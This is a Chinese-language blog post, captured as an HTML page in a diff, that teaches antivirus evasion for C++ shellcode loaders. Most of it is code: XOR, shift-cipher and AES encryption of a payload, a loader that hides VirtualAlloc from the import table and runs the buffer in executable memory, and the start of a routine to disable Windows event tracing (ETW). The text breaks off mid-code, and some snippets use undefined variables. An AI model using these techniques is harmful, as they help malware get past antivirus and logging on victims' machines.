@@ -1,0 +1,630 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="baidu-site-verification" content="FBx6u1uWmY">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('https://chenzidu.github.io').hostname,
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.5.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":false,"style":"default"},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    sidebarPadding: 40
+  };
+</script>
+  <meta name="description" content="好久没水文章了，最近一段时间一直在忙项目上的事情。&#x3D; &#x3D;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="C++变形免杀初探（一）">
+<meta property="og:url" content="https://chenzidu.github.io/2022/09/22/C-%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/index.html">
+<meta property="og:site_name" content="Chen&#39;Blog">
+<meta property="og:description" content="好久没水文章了，最近一段时间一直在忙项目上的事情。&#x3D; &#x3D;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://chenzidu.github.io/2022/09/22/C-%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/1.png">
+<meta property="article:published_time" content="2022-09-22T06:50:05.000Z">
+<meta property="article:modified_time" content="2022-12-11T09:31:21.953Z">
+<meta property="article:author" content="ChenZIDu">
+<meta property="article:tag" content="C++">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://chenzidu.github.io/2022/09/22/C-%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/1.png">
+
+<link rel="canonical" href="https://chenzidu.github.io/2022/09/22/C-%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>C++变形免杀初探（一） | Chen'Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Chen'Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Chen'Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">Life has its own fate, and meeting may not be accidental.</p>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-fw fa-sitemap"></i>站点地图</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://chenzidu.github.io/2022/09/22/C-%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="ChenZIDu">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Chen'Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          C++变形免杀初探（一）
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-09-22 14:50:05" itemprop="dateCreated datePublished" datetime="2022-09-22T14:50:05+08:00">2022-09-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-12-11 17:31:21" itemprop="dateModified" datetime="2022-12-11T17:31:21+08:00">2022-12-11</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%85%8D%E6%9D%80/" itemprop="url" rel="index">
+                    <span itemprop="name">免杀</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+<span class="post-time">
+	   &nbsp; | &nbsp;
+           <span class="post-meta-item-icon">
+             <i class="fa fa-calendar-o"></i>
+           </span>
+           <span class="post-meta-item-text">字数统计:</span>
+           <span class="post-count">1.3k(字)</span>
+           
+         </span>
+	  
+      <span class="post-time">
+	   &nbsp; | &nbsp;
+           <span class="post-meta-item-icon">
+             <i class="fa fa-calendar-o"></i>
+           </span>
+           <span class="post-meta-item-text">阅读时长:</span>
+           <span class="post-count">6(分)</span>
+           
+        </span>
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2022/09/22/C-%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2022/09/22/C-%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>好久没水文章了，最近一段时间一直在忙项目上的事情。= =</p>
+<a id="more"></a>
+
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul>
+<li>shellcode -&gt; 加密算法 -&gt;生成恶意加密shellcode -&gt;加载器 -&gt;解密算法 -&gt; 执行恶意shellcode</li>
+</ul>
+<p>利用外部库来进行加解密操作，增加分析难度，可以加base64，不过base64可能会把不可见字符转换出问题，不过两层加密基本够了，太多层反而效率变慢了。</p>
+<h3 id="外部库"><a href="#外部库" class="headerlink" title="外部库"></a>外部库</h3><ul>
+<li>crypto</li>
+<li>boost</li>
+</ul>
+<h2 id="加密部分"><a href="#加密部分" class="headerlink" title="加密部分"></a>加密部分</h2><h3 id="异或部分"><a href="#异或部分" class="headerlink" title="异或部分"></a>异或部分</h3><p>异或和位移，可以说是复杂度最低的算法了，效率高。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>; </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Shift_encryption</span><span class="params">(<span class="keyword">int</span> k, <span class="keyword">char</span> plain[], <span class="keyword">char</span> ciphertext[])</span>  <span class="comment">//移位加密</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; plain[i] != <span class="string">'\0'</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (plain[i] &gt; <span class="number">64</span> &amp;&amp; plain[i] &lt; <span class="number">91</span>)<span class="comment">//确定是字母</span></span><br><span class="line">        &#123;</span><br><span class="line">            ciphertext[i] = plain[i] + k;</span><br><span class="line">            <span class="keyword">if</span> (ciphertext[i] &gt; <span class="number">90</span>) <span class="comment">//保证密文是字母，且大小写不发生改变</span></span><br><span class="line">                ciphertext[i] = ciphertext[i] - <span class="number">26</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (plain[i] &gt; <span class="number">96</span> &amp;&amp; plain[i] &lt; <span class="number">123</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ciphertext[i] = plain[i] + k;</span><br><span class="line">            <span class="keyword">if</span> (ciphertext[i] &gt; <span class="number">122</span>)</span><br><span class="line">                ciphertext[i] = ciphertext[i] - <span class="number">26</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Shift_decryption</span><span class="params">(<span class="keyword">int</span> k, <span class="keyword">char</span> plain[], <span class="keyword">char</span> ciphertext[])</span>  <span class="comment">//移位加密</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; ciphertext[i] != <span class="string">'\0'</span>; i++)<span class="comment">//确定是字母</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ciphertext[i] &gt; <span class="number">64</span> &amp;&amp; ciphertext[i] &lt; <span class="number">91</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            plain[i] = ciphertext[i] - k;</span><br><span class="line">            <span class="keyword">if</span> (plain[i] &lt; <span class="number">65</span>)<span class="comment">//保证密文是字母，且大小写不发生改变</span></span><br><span class="line">                plain[i] = plain[i] + <span class="number">26</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ciphertext[i] &gt; <span class="number">96</span> &amp;&amp; ciphertext[i] &lt; <span class="number">123</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            plain[i] = ciphertext[i] - k;</span><br><span class="line">            <span class="keyword">if</span> (plain[i] &lt; <span class="number">97</span>)<span class="comment">//保证密文是字母，且大小写不发生改变</span></span><br><span class="line">                plain[i] = plain[i] + <span class="number">26</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> password = <span class="number">1025</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> enShellCode[<span class="number">6000</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> deShellCode[<span class="number">6000</span>];</span><br><span class="line">    <span class="keyword">int</span> nLen = <span class="keyword">sizeof</span>(buf) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nLen; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        enShellCode[i] = buf[i] ^ password;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\\x%x"</span>, enShellCode[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nLen; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        deShellCode[i] = enShellCode[i] ^ password;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\\x%x"</span>, deShellCode[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="时间戳"><a href="#时间戳" class="headerlink" title="时间戳"></a>时间戳</h3><p> 获取时间戳来进行aes加密，利用外部库boost获取时间戳。</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int64_t GetCurrentStamp64()</span><br><span class="line">&#123;</span><br><span class="line">    /<span class="regexp">/获取当前时间戳(秒or毫秒)</span></span><br><span class="line"><span class="regexp">    boost::posix_time::ptime epoch(boost::gregorian::date(1970, boost::gregorian::Jan, 1));</span></span><br><span class="line"><span class="regexp">    boost::posix_time::time_duration time_from_epoch = boost::posix_time::second_clock::universal_time() - epoch;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">    return time_from_epoch.total_seconds();</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure>
+<h3 id="AES加密"><a href="#AES加密" class="headerlink" title="AES加密"></a>AES加密</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">enAES</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 使用ECB模式加密</span></span><br><span class="line">        ECB_Mode&lt; AES &gt;::Encryption e;</span><br><span class="line">        e.SetKey(key, <span class="keyword">sizeof</span>(key));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在此处加密</span></span><br><span class="line">        <span class="comment">// StreamTransformationFilter根据需要添加填充，使用PKCS_padding（PKCS7Padding）默认值。</span></span><br><span class="line">        <span class="comment">// ECB和CBC模式必须填充到密码的块大小。</span></span><br><span class="line">        StringSource(strPlain, <span class="literal">true</span>,</span><br><span class="line">            <span class="keyword">new</span> StreamTransformationFilter(e,</span><br><span class="line">                <span class="keyword">new</span> StringSink(strCipher) <span class="comment">// 字符串接收器</span></span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (<span class="keyword">const</span> Exception&amp; e)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cerr</span> &lt;&lt; e.what() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    strEncoded.<span class="built_in">clear</span>();</span><br><span class="line">    StringSource(strCipher, <span class="literal">true</span>,</span><br><span class="line">        <span class="keyword">new</span> HexEncoder(</span><br><span class="line">            <span class="keyword">new</span> StringSink(strEncoded)</span><br><span class="line">        ) <span class="comment">//</span></span><br><span class="line">    ); <span class="comment">// StringSource</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">deAES</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// decrypt with ECB mode</span></span><br><span class="line">        ECB_Mode&lt; AES &gt;::Decryption d;</span><br><span class="line">        d.SetKey(key, <span class="keyword">sizeof</span>(key));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// The StreamTransformationFilter removes padding as required.</span></span><br><span class="line">        <span class="function">StringSource <span class="title">s</span><span class="params">(strCipher, <span class="literal">true</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="keyword">new</span> StreamTransformationFilter(d,</span></span></span><br><span class="line"><span class="function"><span class="params">                <span class="keyword">new</span> StringSink(strRecovered) <span class="comment">// StringSink</span></span></span></span><br><span class="line"><span class="function"><span class="params">            ) <span class="comment">// StreamTransformationFilter</span></span></span></span><br><span class="line"><span class="function"><span class="params">        )</span></span>; <span class="comment">// StringSource</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (<span class="keyword">const</span> Exception&amp; e)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cerr</span> &lt;&lt; e.what() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="加载"><a href="#加载" class="headerlink" title="加载"></a>加载</h2><h3 id="导入表混淆"><a href="#导入表混淆" class="headerlink" title="导入表混淆"></a>导入表混淆</h3><h2 id="修改参数为函数名"><a href="#修改参数为函数名" class="headerlink" title="修改参数为函数名"></a>修改参数为函数名</h2><p>原理：对C++程序的导入表进行混淆。不做任何混淆时的导入表存在例如VirtualAlloc这样的敏感函数，通过隐藏函数的方式来减少马子特征。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> VOID *(WINAPI* pVirtualAlloc)(LPVOID lpAddress, SIZE_T  dwSize, DWORD flAllocationType, DWORD flProtect);</span><br><span class="line">pVirtualAlloc fnVirtualProtect;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> sVirtualProtect[] = &#123; <span class="string">'V'</span>,<span class="string">'i'</span>,<span class="string">'r'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'a'</span>,<span class="string">'l'</span>,<span class="string">'A'</span>,<span class="string">'l'</span>,<span class="string">'l'</span>,<span class="string">'o'</span>,<span class="string">'c'</span>, <span class="number">0x0</span> &#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> sKernel32[] = &#123; <span class="string">'k'</span>,<span class="string">'e'</span>,<span class="string">'r'</span>,<span class="string">'n'</span>,<span class="string">'e'</span>,<span class="string">'l'</span>,<span class="string">'3'</span>,<span class="string">'2'</span>,<span class="string">'.'</span>,<span class="string">'d'</span>,<span class="string">'l'</span>,<span class="string">'l'</span>, <span class="number">0x0</span> &#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	fnVirtualProtect = (pVirtualAlloc)GetProcAddress(GetModuleHandle((LPCSTR)sKernel32), (LPCSTR)sVirtualProtect);</span><br><span class="line">	<span class="keyword">void</span>* exec = fnVirtualProtect(<span class="number">0</span>, <span class="keyword">sizeof</span> shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="built_in">memcpy</span>(exec, deShellCode, <span class="keyword">sizeof</span> deShellCode);</span><br><span class="line">	((<span class="keyword">void</span>(*)())exec)();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="禁用Windows事件跟踪-ETW"><a href="#禁用Windows事件跟踪-ETW" class="headerlink" title="禁用Windows事件跟踪 (ETW)"></a>禁用Windows事件跟踪 (ETW)</h2><p>原理：Windows 事件跟踪 (ETW) 是一种有效的内核级跟踪工具，允许你将内核或应用程序定义的事件记录到日志文件中。 可以实时或从日志文件使用事件，并使用它们调试应用程序或确定应用程序中发生性能问题的位置。</p>
+<p>ETW 允许动态启用或禁用事件跟踪，使你可以在生产环境中执行详细的跟踪，而无需重启计算机或应用程序。</p>
+<p>结合混淆导入表代码如下：</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">void</span>* (*tNtVirtual) 